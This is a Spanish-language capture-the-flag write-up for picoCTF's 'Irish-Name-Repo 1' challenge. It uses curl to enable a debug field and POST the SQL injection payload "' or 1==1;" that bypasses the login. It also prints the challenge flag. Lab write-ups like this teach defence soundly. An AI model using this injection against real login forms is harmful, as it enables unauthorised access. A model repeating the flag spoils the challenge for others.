# Irish-Name-Repo 1

## Objetivo 
Descripción:
Hay un sitio web en `https://jupiter.challenges.picoctf.org/problem/50009/`( [enlace](https://jupiter.challenges.picoctf.org/problem/50009/) ) o http://jupiter.challenges.picoctf.org:50009. ¿Crees que puedes iniciar sesión con nosotros? ¡Intenta ver si puedes iniciar sesión!

Sugerencias:
No parece haber muchas maneras de interactuar con esto. Me pregunto si los usuarios se mantienen en una base de datos.

Trate de pensar en cómo el sitio web verifica su inicio de sesión.

## Solución
``` shell
//Nos dirijimos al enlace ( [enlace](https://jupiter.challenges.picoctf.org/problem/50009/) )

//nos vamos al menu y luego a soporte donde vemos //el error de sql y vemos que se puede iyectar codigo

//nos vamos al login y vemos el codigo fuente

//aqui podemos ver su codigo y vemos que tiene un //valor oculto <input type="hidden" name="debug" value="0">

//cambiamos ese valor por 1 en el inspector

//username: admin
//password: password
//SQL query: SELECT * FROM users WHERE name='admin' //AND password='password'

//y nos dirigimos al enlas donde esta login
//recuerda que nos tenemos que dirigir en login.php

┌──(mino20㉿kali)-[/home/mino20]
└─PS> curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php 
<h1>Login failed.</h1>

//se me olvido embiar al usuario y la contraseña, //eso lo hacemos con un metodo post para eso //podemos usar el -d y tambien damos el debug con //valor a 1

┌──(mino20㉿kali)-[/home/mino20]
└─PS> curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d 'username=admin&password=password&debug=1'                                                                          
<pre>username: admin
password: password
SQL query: SELECT * FROM users WHERE name='admin' AND password='password'
</pre><h1>Login failed.</h1>


//ahora podemos inyectar la contraseña "'' or 1==1" 
┌──(mino20㉿kali)-[/home/mino20]
└─PS> curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=' or 1==1;&debug=1"                                                                        
<pre>username: admin
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>
```

## Notas
La inyección SQL es una técnica de inyección de código que podría destruir su base de datos.

La inyección SQL es una de las técnicas de piratería web más comunes.

La inyección SQL es la colocación de código malicioso en declaraciones SQL, a través de la entrada de una página web.

## Referencias
[SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)
